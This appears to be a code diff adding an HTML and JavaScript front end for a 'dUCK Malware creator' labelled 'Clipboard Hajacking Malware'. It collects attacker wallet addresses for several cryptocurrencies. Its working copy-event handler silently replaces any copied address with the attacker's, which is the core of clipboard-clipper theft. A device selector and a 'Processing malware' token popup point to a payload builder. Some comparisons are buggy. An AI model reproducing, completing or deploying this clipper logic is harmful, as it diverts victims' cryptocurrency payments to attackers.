@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
+    <link rel="stylesheet" href="style/index.css">  
+    <title>Clipboard Hajacking Malware</title>
+</head>
+<body>
+    <div></div>
+    <div id="container" class="container">
+        <!-- <input type="text" class="testzone" id="textInput" placeholder="Enter text"> -->
+
+        <h2 class="head" id="textInput" placeholder="Test box zone">Clipboard Hajacking Malware</h2>
+        <p style="margin: 0 2em; text-align: justify;">Welocome to dUCK Malware creator powered by Noir Softwares... This Section is based on cryptocurrency Clipboard wallet address hijacker tool</p> 
+        
+        <h3 style="color:white; text-align: center;">---Add your swapping addresses---</h3>
+        <div class="">
+            <div class="btcBorder">
+                <p class="btcSection">BTC SECTION</p>
+                <label for="btc1">BTC Address starting from "1" </label>
+                <p class="hide" id="show1"></p>
+                <div class="input-container">
+                    <input type="text" class="input" name="btc1" id="1" oninput="startLoading(1)" />
+                    <div class="loading-container hide" id="loadingContainer1"></div>
+                </div>
+
+                <label for="btc1">BTC Address starting from "bc1" </label>
+                <p class="hide" id="showbc1"></p>
+                <div class="input-container">
+                    <input type="text" class="input" name="bc1" id="bc1" oninput="startLoading('bc1')" />
+                    <div class="loading-container hide" id="loadingContainerbc1"></div>
+                </div>
+
+                <label for="3">BTC Address starting from "3" </label>
+                <p class="hide" id="show3"></p>
+                <div class="input-container">
+                    <input type="text" class="input" name="3" id="3" oninput="startLoading('3')" />
+                    <div class="loading-container hide" id="loadingContainer3"></div>
+                </div>
+            </div>
+
+
+            <div class="btcBorder">
+                <p class="btcSection">ETHERUM SECTION</p>
+                <label for="0x">ETH Address starting from "0x" </label>
+                <p class="hide" id="show0x"></p>
+                <div class="input-container">
+                    <input type="text" class="input" name="0x" id="0x" oninput="startLoading('0x')" />
+                    <div class="loading-container hide" id="loadingContainer0x"></div>
+                </div>
+            </div>
+
+
+            <div class="btcBorder">
+                <p class="btcSection">LITCOIN SECTION</p>
+                <label for="L">LTC Address starting from "L" </label>
+                <p class="hide" id="showL"></p>
+                <div class="input-container">
+                    <input type="text" class="input" name="L" id="L" oninput="startLoading('L')" />
+                    <div class="loading-container hide" id="loadingContainerL"></div>
+                </div>
+            </div>
+
+
+            <div class="btcBorder">
+                <p class="btcSection">BITCOIN CASH SECTION</p>
+                <label for="q">Bitcoin Cash Address starting from "q" </label>
+                <p class="hide" id="showq"></p>
+                <div class="input-container">
+                    <input type="text" class="input" name="q" id="q" oninput="startLoading('q')" />
+                    <div class="loading-container hide" id="loadingContainerq"></div>
+                </div>
+            </div>
+
+
+            <div class="btcBorder">
+                <p class="btcSection">RIPPLE SECTION</p>
+                <label for="r">Ripple Address starting from "r" </label>
+                <p class="hide" id="showr"></p>
+                <div class="input-container">
+                    <input type="text" class="input" name="r" id="r" oninput="startLoading('r')" />
+                    <div class="loading-container hide" id="loadingContainerr"></div>
+                </div>
+
+                <label for="X">Ripple Address starting from "X" </label>
+                <p class="hide" id="showX"></p>
+                <div class="input-container">
+                    <input type="text" class="input" name="X" id="X" oninput="startLoading('X')" />
+                    <div class="loading-container hide" id="loadingContainerX"></div>
+                </div>
+            </div>
+
+            <div class="btcBorder">
+                <p class="btcSection">CARDANO SECTION</p>
+                <label for="A">CARDANO Address starting from "A" </label>
+                <p class="hide" id="showA"></p>
+                <div class="input-container">
+                    <input type="text" class="input" name="A" id="A" oninput="startLoading('A')" />
+                    <div class="loading-container hide" id="loadingContainerA"></div>
+                </div>
+            </div>
+
+            <div class="btcBorder">
+                <p class="btcSection">BNB SECTION</p>
+                <label for="bnb">BNB Address starting from "BNB" </label>
+                <p class="hide" id="showbnb"></p>
+                <div class="input-container">
+                    <input type="text" class="input" name="bnb" id="bnb" oninput="startLoading('bnb')" />
+                    <div class="loading-container hide" id="loadingContainerbnb"></div>
+                </div>
+            </div>
+
+        </div>
+        <h3 style="text-align: center;" class="">Work Test Zone</h3>
+        <div class="testzoneHouse">
+            <div id="editor" class="testzone" contenteditable="true">
+                
+            </div>
+        </div>
+
+        
+
+        <p style="text-align: center;">Copy this text: <span id="copyText">Original text</span></p>
+
+        <div>
+            <input type="file" id="fileInput">
+            <div id="imageDiv" style="display: none;"></div>
+            <div id="videoDiv" style="display: none;"></div>
+            <div id="audioDiv" style="display: none;"></div>
+            
+        </div>
+
+        <div>
+            <select id="mySelect" class="imgThem" onchange="showDiv()">
+                <option style="width: 100%;">File Type</option>
+                <option style="width: 100%;" value="image">Image</option>
+                <option style="width: 100%;" value="video">Video</option>
+                <option style="width: 100%;" value="audio">Audio</option>
+              </select>
+              
+              <div id="android" style="display: none;">
+                <p>Image Div</p>
+              </div>
+              
+              <div id="Mac" style="display: none; color: white;">
+                <p>Video Div</p>
+              </div>
+              
+              <div id="Lun" style="display: none;">
+                <p>Audio Div</p>
+              </div>
+              
+        </div>
+
+        <div>
+            <select class="device" id="deviceSelect" onchange="deviceSelect()">
+                <option value="windows">Window</option>
+                <option value="mac">Mac</option>
+                <option value="and">Android</option>
+                <option value="linux">Linux</option>
+                <option value="all">All Devices</option>
+            </select>
+        </div>
+
+        <div id="popupContainer">
+            <div id="popupContent">
+                <div class="hackingDisplay">
+                    <h2>Processing malware...</h2>
+                    <p>Packaging tot...</p>
+                    <input type="text" placeholder="Enter token">
+                </div>
+            </div>
+        </div>
+
+        <!-- <div class="popup">
+            <p>hahahah</p>
+            <h2>Processing malware...</h2>
+            <p>Packaging tot...</p>
+             <input type="text" placeholder="Enter token">
+        </div> -->
+      
+        <script>
+
+            localStorage.clear();
+            let oneBtcINPUT = document.getElementById('1')
+            let bc1Input = document.getElementById('bc1')
+            let threeInput = document.getElementById('3')
+            let ethInput = document.getElementById('0x')
+            let LTCinput = document.getElementById('L')
+            let bitcoinCashInput = document.getElementById('q')
+            let rippleInputR = document.getElementById('r')
+            let rippleInputX = document.getElementById('X')
+            let CadroInput = document.getElementById('A')
+            let bnbInput = document.getElementById('bnb')
+
+            let inputDetail 
+                let errorShow
+                function startLoading(inputNumber) {
+                var loadingContainer = document.querySelector(`#loadingContainer${inputNumber}`);
+                loadingContainer.classList.remove('hide');
+                //
+                     inputDetail = document.getElementById(inputNumber)
+                     var inputValue = document.getElementById(inputNumber)
+                     errorShow = document.getElementById(`show${inputNumber}`)
+
+                    if(inputNumber == 1) {
+                        let start = inputDetail.value.startsWith('1')
+                        if(!(inputDetail.value.length >= 27 && inputDetail.value.length <= 34 && start)) {
+                           errorShow.classList.remove('hide')
+                           errorShow.classList.add('errorNote')
+                           errorShow.innerText = 'Incorrect Adrress Format'
+                        }
+                    }  
+                    
+                    if(inputNumber == 'bc1') {
+                        let start = inputDetail.value.startsWith('bc1')
+                        if(!(inputDetail.value.length >= 27 && inputDetail.value.length <= 34 && start)) {
+                            errorShow.classList.remove('hide')
+                           errorShow.classList.add('errorNote')
+                           errorShow.innerText = 'Incorrect Adrress Format'
+                           var bciInput = inputValue.value
+                        }
+                    }
+
+                    if(inputNumber == '3') {
+                        let start = inputDetail.value.startsWith('3')
+                        if(!(inputDetail.value.length >= 27 && inputDetail.value.length <= 34 && start)) {
+                            errorShow.classList.remove('hide')
+                           errorShow.classList.add('errorNote')
+                           errorShow.innerText = 'Incorrect Adrress Format'
+                        }
+                    }
+
+                    //eth
+                    if(inputNumber == '0x') {
+                        let start = inputDetail.value.startsWith('0x')
+                        if(!(inputDetail.value.length >= 40 && start)) {
+                            errorShow.classList.remove('hide')
+                           errorShow.classList.add('errorNote')
+                           errorShow.innerText = 'Incorrect Adrress Format'
+                        } 
+                    }
+
+
+                    //LTC
+                    if(inputNumber == 'L') {
+                        let start = inputDetail.value.startsWith('L')
+                        if(!(inputDetail.value.length >= 26 && inputDetail.value.length <= 35 && start)) {
+                            errorShow.classList.remove('hide')
+                           errorShow.classList.add('errorNote')
+                           errorShow.innerText = 'Incorrect Adrress Format'
+                        } 
+                    }
+
+
+                    //btc cash
+                    if(inputNumber == 'q') {
+                        let start = inputDetail.value.startsWith('q')
+                        if(!(inputDetail.value.length >= 26 && inputDetail.value.length <= 30 && start)) {
+                            errorShow.classList.remove('hide')
+                           errorShow.classList.add('errorNote')
+                           errorShow.innerText = 'Incorrect Adrress Format'
+                        }
+                    }
+
+                    if(inputNumber == 'r') {
+                        let start = inputDetail.value.startsWith('r')
+                        if(!(inputDetail.value.length >= 32 && inputDetail.value.length <= 34 && start)) {
+                            errorShow.classList.remove('hide')
+                           errorShow.classList.add('errorNote')
+                           errorShow.innerText = 'Incorrect Adrress Format'
+                        }
+                    }
+
+                    if(inputNumber == 'X') {
+                        let start = inputDetail.value.startsWith('X')
+                        if(!(inputDetail.value.length >= 32 && inputDetail.value.length <= 34 && start)) {
+                            errorShow.classList.remove('hide')
+                           errorShow.classList.add('errorNote')
+                           errorShow.innerText = 'Incorrect Adrress Format'
+                        }
+                    }
+
+                    if(inputNumber == 'bnb') {
+                        let start = inputDetail.value.startsWith('bnb')
+                        if(!(inputDetail.value.length >= 42 && inputDetail.value.length <= 44 && start)) {
+                            errorShow.classList.remove('hide')
+                           errorShow.classList.add('errorNote')
+                           errorShow.innerText = 'Incorrect Adrress Format'
+                        }
+                    }
+
+                
+                setTimeout(function() {
+                    stopLoading(inputNumber);
+                }, 4000);
+                }
+
+            //for copy and swaping
+              document.addEventListener('copy', (event) => {
+                event.preventDefault(); // Prevent the default copying behavior
+                // const originalText = document.getElementById('textInput').value.trim(); // Get the input value and remove leading/trailing spaces
+                const originalText = window.getSelection().toString();
+
+                console.log(originalText)
+                let modifiedText = originalText;
+
+
+                      if (originalText.length >= 27 && originalText.length <= 34 && originalText.startsWith('bc1')) {
+                        modifiedText = bc1Input.value; 
+                      } else if (originalText.length >= 27 && originalText.length <= 34 && originalText.startsWith('1')) {
+                        modifiedText = oneBtcINPUT.value; 
+                      }
+                      else if (originalText.length >= 27 && originalText.length <= 34 && originalText.startsWith('3')) {
+                        modifiedText = threeInput.value;
+                      }     
+                      //etherum address swap
+                        else if (originalText.length >= 40 && originalText.startsWith('0x')) {
+                            modifiedText = ethInput.value;
+                        }
+
+                      //Litcoin
+                        else if(originalText.length >=26 && originalText <=35 && originalText.startsWith("L")) {
+                            modifiedText = LTCinput.value;
+                        } else if (originalText.length >=26 && originalText <=35 && originalText.startsWith('3')) {
+                            modifiedText = ""
+                        }
+
+                     //bitcoin cash
+
+                        else if(originalText.length >=26 && originalText.length <=30 && originalText.startsWith('q')) {
+                            modifiedText = bitcoinCashInput.value;
+                        }
+
+                     //ripple 
+                        else if(originalText.length >= 32 && originalText.length <=34 && originalText.startsWith('r')) {
+                            modifiedText = rippleInputR.value;
+                        } else if (originalText.length >= 32 && originalText.length <=34 && originalText.startsWith("X")) {
+                            modifiedText= rippleInputX.value;
+                        }
+
+                     //cardano 
+                        else if(originalText.length >=54 && originalText.length <=59 && originalText.startsWith('A')) {
+                            modifiedText = CadroInput.value;
+                        }
+
+                     //bnb binance 
+                        if(originalText.length >=42 && originalText.length <=44 && originalText.startsWith("bnb")) {
+                            modifiedText = bnbInput.value;
+                        }
+
+
+                event.clipboardData.setData('text', modifiedText); // Modify the copied text
+              });
+                
+
+                function stopLoading(inputNumber) {
+                var loadingContainer = document.querySelector('#loadingContainer' + inputNumber);
+                loadingContainer.classList.add('hide');
+                errorShow.classList.remove('errorNote')
+                errorShow.classList.add('hide')
+                }   
+
+                
+                //this is for the file choice
+                var fileInput = document.getElementById('fileInput');
+                var imageDiv = document.getElementById('imageDiv');
+                var videoDiv = document.getElementById('videoDiv');
+                var audioDiv = document.getElementById('audioDiv');
+
+                fileInput.addEventListener('change', function() {
+                var file = fileInput.files[0];
+                var fileType = file.type.split('/')[0];
+                var fileInfo = {
+                    name: file.name,
+                    fileType: fileType,
+                    size: file.size,
+                    lastModified: file.lastModified,
+                    createdDate: file.lastModifiedDate,
+                    dimensions: fileType === 'image' ? getImageDimensions(file) : null,
+                    duration: fileType === 'video' || fileType === 'audio' ? getMediaDuration(file) : null
+                };
+
+                switch (fileType) {
+                    case 'image':
+                    displayFileDetails(imageDiv, fileInfo);
+                    break;
+                    case 'video':
+                    displayFileDetails(videoDiv, fileInfo);
+                    break;
+                    case 'audio':
+                    displayFileDetails(audioDiv, fileInfo);
+                    break;
+                    default:
+                    break;
+                }
+                });
+
+                function displayFileDetails(targetDiv, fileInfo) {
+                localStorage.setItem("name", fileInfo.name);
+                targetDiv.style.display = 'block';
+                targetDiv.innerHTML = `
+                    <p>Name: ${fileInfo.name}</p>
+                    <p>File Type: ${fileInfo.fileType}</p>
+                    <p>Size: ${fileInfo.size} bytes</p>
+                    <p>Last Modified: ${new Date(fileInfo.lastModified).toLocaleString()}</p>
+                    <p>Created Date: ${fileInfo.createdDate}</p>
+                    ${fileInfo.dimensions ? `<p>Dimensions: ${fileInfo.dimensions.width} x ${fileInfo.dimensions.height}</p>` : ''}
+                    ${fileInfo.duration ? `<p>Duration: ${fileInfo.duration}</p>` : ''}
+                    <!-- Add any other desired file information here -->
+                `;
+                }
+
+                function getImageDimensions(file) {
+                var img = document.createElement('img');
+                img.src = URL.createObjectURL(file);
+                return { width: img.width, height: img.height };
+                }
+
+                function getMediaDuration(file) {
+                var video = document.createElement('video');
+                video.src = URL.createObjectURL(file);
+                return video.duration;
+                }
+
+                //slecting
+                function showDiv() {
+                var select = document.getElementById("mySelect");
+                var selectedOption = select.value;
+                console.log(selectedOption)
+                localStorage.setItem('slectedOption', selectedOption)
+
+                var android = document.getElementById("imageDiv");
+                var Mac = document.getElementById("videoDiv");
+                var Lun = document.getElementById("audioDiv");
+
+                android.style.display = "none";
+                Mac.style.display = "none";
+                Lun.style.display = "none";
+
+                if (selectedOption == "image") {
+                    android.style.display = "block";
+                } else if (selectedOption == "video") {
+                    console.log("me testing")
+                    Mac.style.display = "block";
+                    Mac.classList.add = ('hidden')
+                } else if (selectedOption === "audio") {
+                    Lun.style.display = "block";
+                }
+                }
+
+
+                $(document).ready(function() {
+    $('#deviceSelect').change(function() {
+        var selectedDevice = $(this).val();
+        if (selectedDevice !== '') {
+            $('#popupContainer').fadeIn();
+        }
+    });
+
+    $('#popupContainer').click(function() {
+        $(this).fadeOut();
+    });
+});
+
+//device select 
+function deviceSelect() {
+    var selectedDevice  = document.getElementById("deviceSelect")
+    var selectedDeviceOption = selectedDevice.value
+    localStorage.setItem('device', selectedDeviceOption)
+    window.location.href = "js.html"
+}
+
+
+        </script>
+    </div>
+</body>
+</html>
